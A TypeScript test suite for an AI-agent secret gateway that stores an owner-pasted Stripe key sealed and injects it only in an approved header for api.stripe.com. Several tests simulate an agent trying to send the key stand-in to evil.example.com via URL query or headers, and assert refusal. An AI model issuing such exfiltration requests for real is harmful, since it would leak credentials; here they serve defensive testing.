import { test, after } from 'node:test'
import assert from 'node:assert/strict'
import { createServer, type IncomingHttpHeaders } from 'node:http'
import { once } from 'node:events'
import type { AddressInfo } from 'node:net'
import { Client } from '@modelcontextprotocol/sdk/client/index.js'
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js'
import { fakeAgentd, refresh, signIn } from '../agents/signed-in.ts'
import { appWakes } from '../../plugins/chat/app-wakes.ts'

const VALUE = 'sk_test_OBVIOUS_FAKE_VALUE_123'
const written: string[] = []
for (const stream of [process.stdout, process.stderr]) {
  const write = stream.write.bind(stream) as (chunk: unknown, ...rest: unknown[]) => boolean
  stream.write = ((chunk: unknown, ...rest: unknown[]) => { written.push(String(chunk)); return write(chunk, ...rest) }) as typeof stream.write
}

const seen: { url: string; headers: IncomingHttpHeaders }[] = []
const fake = createServer((req, res) => {
  seen.push({ url: req.url ?? '', headers: req.headers })
  res.writeHead(200, { 'content-type': 'application/json' }).end('{"ok":true}')
}).listen(0, '127.0.0.1')
await once(fake, 'listening')

const { db, migrate } = await import('../../../src/server/platform/db.ts')
const { agentToken, seal } = await import('../../../src/server/platform/secrets.ts')
const { gatewayServer } = await import('../../../src/server/gateway/gateway-server.ts')
const { keyedRoute } = await import('../../../src/server/gateway/broker.ts')
const { asks } = await import('../../../src/core/asks.ts')
const { secretService } = await import('../../../src/server/agents/secret-service.ts')
const { render } = await import('../../../src/adapters/hermes/render.ts')
const { runSet } = await import('../../../src/server/agents/run-set.ts')
keyedRoute.origin = () => `http://127.0.0.1:${(fake.address() as AddressInfo).port}`

fakeAgentd()
await migrate()
await db.insertInto('person').values({ id: 'usr_secowner', email: 'sec@example.com', role: 'owner', removed_at: null }).execute()
for (const [id, net] of [['ag_secagent', 81], ['ag_secother', 82]] as const) await db.insertInto('agent').values({ id, name: 'Pulse', owner_id: 'usr_secowner', instructions: '#', model: 'claude:sonnet', net, channel_key: seal('k'.repeat(48)), wanted: 'stopped' }).execute()
signIn({ email: 'sec@example.com' })
runSet.watch()
await refresh()
const owner = { id: 'usr_secowner', email: 'sec@example.com', role: 'owner' as const }
const { told, settled } = appWakes()

const gateway = gatewayServer.create().listen(0, '127.0.0.1')
await once(gateway, 'listening')
const gw = `http://127.0.0.1:${(gateway.address() as AddressInfo).port}`
const token = agentToken({ id: 'ag_secagent', epoch: 0 })
const client = new Client({ name: 'hermes', version: '1' })
await client.connect(new StreamableHTTPClientTransport(new URL(`${gw}/api/v1/mcp`), { requestInit: { headers: { authorization: `Agent ${token}` } } }))
const call = (path: string, headers: Record<string, string> = {}, agent = token) => fetch(`${gw}${path}`, { headers: { authorization: `Agent ${agent}`, ...headers } })
const textOf = (result: Awaited<ReturnType<Client['callTool']>>) => (result.content as { text: string }[])[0].text
after(() => {
  void client.close()
  gateway.close()
  fake.close()
})

test('add_secret waits for the owner, who pastes the value; it is stored sealed and the agent hears only that it was saved', async () => {
  const asked = textOf(await client.callTool({ name: 'add_secret', arguments: { description: 'To check failed payments.', name: 'STRIPE_KEY', hosts: ['api.stripe.com'], origin: { platform: 'api_server', chat_id: 'openhut-sec' } } }))
  const id = /ask_[a-z0-9]+/.exec(asked)?.[0] ?? ''
  assert.match(asked, /Save a key, STRIPE_KEY, sent only to api\.stripe\.com/)
  await assert.rejects(asks.approve({ actor: owner, id }), /Paste the key/)
  const approved = await asks.approve({ actor: owner, id, answer: { hosts: ['evil.example.com'], value: VALUE } })
  assert.equal(approved.status, 'done')
  assert.deepEqual(approved.input, { name: 'STRIPE_KEY', hosts: ['api.stripe.com'], header: 'Authorization: Bearer {value}' })
  const row = await db.selectFrom('agent_secret').selectAll().where('agent_id', '=', 'ag_secagent').executeTakeFirstOrThrow()
  assert.equal(row.name, 'STRIPE_KEY')
  assert.ok(!row.value.includes(VALUE))
  assert.deepEqual((await secretService.held({ agentId: 'ag_secagent' }))[0].value, VALUE)
  const listed = await secretService.list({ actor: owner, agentId: 'ag_secagent' })
  assert.deepEqual(listed.map(({ name, hosts }) => ({ name, hosts })), [{ name: 'STRIPE_KEY', hosts: ['api.stripe.com'] }])
  await settled()
  assert.match(told.map(({ text }) => text).join('\n'), /Approved and done: Save a key, STRIPE_KEY/)
  const requests = await db.selectFrom('ask').selectAll().execute()
  assert.ok(!JSON.stringify([requests, listed, told]).includes(VALUE))
})

test('the agent gets a stand-in in its env and instructions, never the value', () => {
  const files = render({
    agent: { id: 'ag_secagent', name: 'Pulse', instructions: '#', slots: { primary: { provider: 'claude', model: 'sonnet' } } as never, net: 81, code_execution: true, web_browser: false },
    token, channelKey: 'k', channels: [], connections: [], secrets: [{ name: 'STRIPE_KEY', hosts: ['api.stripe.com'] }],
  })
  assert.match(files['.env'], /^OPENHUT_SECRET_STRIPE_KEY=openhut-secret-STRIPE_KEY$/m)
  assert.match(files['SOUL.md'], /\$OPENHUT_GATEWAY\/x\/api\.stripe\.com\//)
  assert.ok(!Object.values(files).join('\n').includes(VALUE))
})

test('the gateway adds the key only in its configured header, and refuses a stand-in in the URL or another header', async () => {
  const before = seen.length
  for (const [path, headers] of [
    ['/x/api.stripe.com/v1/openhut-secret-STRIPE_KEY', {}],
    ['/x/api.stripe.com/v1/charges?key=openhut-secret-STRIPE_KEY', {}],
    ['/x/api.stripe.com/v1/charges', { 'x-extra': 'openhut-secret-STRIPE_KEY' }],
  ] as const) {
    const refused = await call(path, headers)
    assert.equal(refused.status, 403, path)
    assert.match(await refused.text(), /only in the header your owner set for it/)
  }
  assert.equal(seen.length, before)
  const res = await call('/x/api.stripe.com/v1/charges?limit=3', { 'x-extra': 'plain' })
  assert.equal(res.status, 200)
  assert.ok(!(await res.text()).includes(VALUE))
  const last = seen.at(-1)
  assert.equal(last?.headers.authorization, `Bearer ${VALUE}`)
  assert.equal(last?.headers['x-extra'], 'plain')
  assert.equal(last?.url, '/v1/charges?limit=3')
  assert.ok(!JSON.stringify(last?.headers).replace(`Bearer ${VALUE}`, '').includes(VALUE))
  assert.ok((await db.selectFrom('agent_secret').select('used_at').where('name', '=', 'STRIPE_KEY').executeTakeFirstOrThrow()).used_at)
})

test('a stand-in for another host, an unknown key, or a host with no key is refused and nothing goes out', async () => {
  const before = seen.length
  const stray = await call('/x/evil.example.com/collect?k=openhut-secret-STRIPE_KEY')
  assert.equal(stray.status, 403)
  assert.match(await stray.text(), /won't send STRIPE_KEY to evil\.example\.com: STRIPE_KEY only goes to api\.stripe\.com/)
  assert.equal((await call('/x/evil.example.com/collect', { 'x-k': 'openhut-secret-STRIPE_KEY' })).status, 403)
  assert.equal((await call('/x/api.stripe.com/v1', { 'x-k': 'openhut-secret-OTHER_KEY' })).status, 403)
  assert.equal((await call('/x/example.com/')).status, 403)
  assert.equal((await call('/x/api.stripe.com/v1', {}, agentToken({ id: 'ag_secother', epoch: 0 }))).status, 403)
  assert.equal((await fetch(`${gw}/x/api.stripe.com/v1`)).status, 401)
  assert.equal(seen.length, before)
  const events = await db.selectFrom('connection_event').select(['tool', 'outcome', 'reason']).where('agent_id', '=', 'ag_secagent').execute()
  assert.ok(events.some((event) => event.outcome === 'denied' && event.tool.startsWith('evil.example.com')))
  assert.ok(!JSON.stringify(events).includes(VALUE))
})

test('the owner replaces and removes a key; the value never reaches a log', async () => {
  const [secret] = await secretService.list({ actor: owner, agentId: 'ag_secagent' })
  const replaced = await secretService.replace({ actor: owner, id: secret.id, value: 'sk_test_SECOND_FAKE' })
  assert.ok(!JSON.stringify(replaced).includes('sk_test_'))
  assert.equal((await secretService.held({ agentId: 'ag_secagent' }))[0].value, 'sk_test_SECOND_FAKE')
  assert.deepEqual(await secretService.delete({ actor: owner, id: secret.id }), { id: secret.id, object: 'agent_secret', deleted: true })
  assert.deepEqual(await secretService.list({ actor: owner, agentId: 'ag_secagent' }), [])
  assert.equal((await call('/x/api.stripe.com/v1')).status, 403)
  assert.ok(!written.join('').includes(VALUE) && !written.join('').includes('sk_test_SECOND_FAKE'))
})
